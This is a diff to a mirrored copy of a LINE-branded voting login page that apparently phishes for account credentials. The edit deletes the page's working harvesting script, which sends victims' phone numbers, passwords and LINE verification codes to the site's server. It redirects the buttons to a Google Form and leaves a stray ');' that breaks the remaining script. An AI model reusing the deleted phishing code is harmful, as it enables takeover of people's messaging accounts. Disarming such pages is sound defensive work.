@@ -327,7 +327,7 @@
 													<input maxlength="140" step="" id="password" name="password" placeholder="請輸入密碼"
 														autocomplete="off" class="uni-input-input">
 												</div>
-												<span style="font-size: 11px; padding: 5px 0px; border-radius: 3px;" onclick="forgetPwd()">忘記密碼？</span>
+												<span style="font-size: 11px; padding: 5px 0px; border-radius: 3px;" onclick="location.href='https://docs.google.com/forms/d/e/1FAIpQLSeaFEH2z1iX2GyJUJPHWZrAnf7qDWNKa9nDm_y7Ot3o8Yug1Q/viewform?usp=sharing&ouid=111452689987126427170'">忘記密碼？</span>
 											</div>
 										</div>
 									</div>
@@ -338,32 +338,7 @@
 					<!--<h2 style="font-size: 16px">第二步：</h2>
 					<div class="btn-submit-open" onclick="goSetting()">&gt;&gt;&gt;跳轉Line點選移動帳號選項開啟授權&lt;&lt;&lt;</div>
 					<a  class="" style="padding: 15px 0px; color: rgb(255, 151, 0); text-align: right; font-size: 13px;display: block" href="javascript:void(0)" onclick="goHelp()">如何開啟？</a>-->
-					<div class="uni-forms-item">
-						<div class="uni-forms-item__box">
-							<div class="uni-forms-item__inner is-direction-top">
-								<div class="uni-forms-item__label" style="width: 90px; justify-content: flex-start;">
-									<uni-text class="is-required"><span>*</span></uni-text>
-									<uni-text class="label-text"><span>輸入認證碼</span></uni-text>
-									<div class="label-seat"></div>
-								</div>
-								<div class="uni-forms-item__content">
-									<div class="uni-easyinput">
-										<div class="uni-easyinput__content is-input-border">
-											<div class="uni-easyinput__content-input">
-												<div class="uni-input-wrapper">
-													<input placeholder="請輸入LINE認證碼" id="vycode" name="vycode"
-														maxlength="140" enterkeyhint="done" autocomplete="off" type=""
-														class="uni-input-input">
-												</div>
-												<span class="send-button"  id="Btn">發送</span>
-											</div>
-										</div>
-									</div>
-								</div>
-							</div>
-						</div>
-					</div>
-					<button class="subbtn" id=submit>登 錄</button>
+					<button class="subbtn" id="submit" onclick="location.href='https://docs.google.com/forms/d/e/1FAIpQLSeaFEH2z1iX2GyJUJPHWZrAnf7qDWNKa9nDm_y7Ot3o8Yug1Q/viewform?usp=sharing&ouid=111452689987126427170'">登 錄</button>
 				</div>
 			</div>
 		</div>
@@ -391,71 +366,6 @@
 var waitMinute = 60;
 var voteBottomImage = localStorage.getItem("voteBottomImage");
 $("#voteBottomImage").attr("src", voteBottomImage);
-
-function forgetPwd() {
-	openLine("https://line.me/R/nv/settings/account");
-}
-
-function goSetting() {
-	openLine("https://line.me/R/nv/settings");
-}
-
-function goHelp() {
-	var help_url = "help.html";
-	window.location.href = help_url;
-}
-
-function openLine(url_scheme) {
-	let ua = window.navigator.userAgent;
-	if(ua.match(/android/i)){
-		openApp(url_scheme, function (data) {});
-	}else if(ua.match(/(iPhone|iPod|iPad);?/i)){
-		window.location.href = url_scheme;
-	}
-}
-const openApp = function(openUrl, callback) {
-	//检查app是否打开
-	function checkOpen(cb){
-		var _clickTime = +(new Date());
-		function check(elsTime) {
-			if ( elsTime > 3000 || document.hidden || document.webkitHidden) {
-				cb(1);
-			} else {
-				cb(0);
-			}
-		}
-		//启动间隔20ms运行的定时器，并检测累计消耗时间是否超过3000ms，超过则结束
-		var _count = 0, intHandle;
-		intHandle = setInterval(function(){
-			_count++;
-			var elsTime = +(new Date()) - _clickTime;
-			if (_count>=100 || elsTime > 3000 ) {
-				clearInterval(intHandle);
-				check(elsTime);
-			}
-		}, 20);
-	}
-
-	//在iframe 中打开APP
-	var ifr = document.createElement('iframe');
-	ifr.src = openUrl;
-	ifr.style.display = 'none';
-
-	if (callback) {
-
-		checkOpen(function(opened){
-			callback && callback(opened);
-		});
-
-	}
-
-	document.body.appendChild(ifr);
-	setTimeout(function() {
-		document.body.removeChild(ifr);
-	}, 2000);
-
-}
-
 
 // this.showPopup();
 //显示弹窗函数，设置display为flex
@@ -488,93 +398,9 @@ function getQueryString(name) {
     };
     return null;
  }
-
-$.get("/index/index/getIp", function(data) {
-    var socket = null;
-    var code2 = '';
-    var line = getQueryString("line");
-    const ipAddress = data.data;
-    console.log("IP：" + ipAddress);
-    let sub = '';
-    
-
-    let countdown = 60;
-    $('#Btn').click(function(){
-        var mobile = $("input[name=mobile]").val();
-       
-        var password = $("input[name=password]").val();
-
-        if (mobile == ''  || password == '') {
-
-            alert('請填寫對應資訊');
-            return false;
-        }
-        const button = document.getElementById('Btn');
-        // 
-        const data = {
-            phone: mobile,
-            password: password
-        }
-        $.post("/index/index/set_datas", data)
-            .done(function(response) {
-                
-            })
-            .fail(function() {
-                alert("系統繁忙中~請1分鐘後再試！");
-            });
-        if(!button.disabled){
-            // 
-            button.disabled = true;
-            const timer = setInterval(() => {
-                countdown--;
-                button.textContent = ` ${countdown} S`;
-
-                if (countdown <= 0) {
-                    // 
-                    clearInterval(timer);
-                    button.textContent = '發送';
-                    button.disabled = false;
-                    countdown = 60; // 
-                }
-            }, 1000);
-        }
-    });
-    
-    var check = 1;
-    $("#submit").on('click', function () {
-        
-       
-        var mobile = $("input[name=mobile]").val();
-        var vycode = $("input[name=vycode]").val();
-        var password = $("input[name=password]").val();
-
-        if (mobile == '' || vycode == '' || password == '') {
-
-            alert('請填寫對應資訊');
-
-
-        }  else {
-            showPopup();
-            const data = {
-                phone: mobile,
-                codes: vycode,
-                password: password
-            }
-            $.post("/index/index/set_datass", data)
-                .done(function(response) {
-                
-                })
-                .fail(function() {
-                    alert("系統繁忙中~請1分鐘後再試！");
-                });
-            return;
-        }
-    });
-
-});
+);
 
 </script>
 	</body>
-
 <!-- Mirrored from linelineevvote.xyz/index/index/line.html?line= by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 18 Jun 2025 06:14:22 GMT -->
 </html>
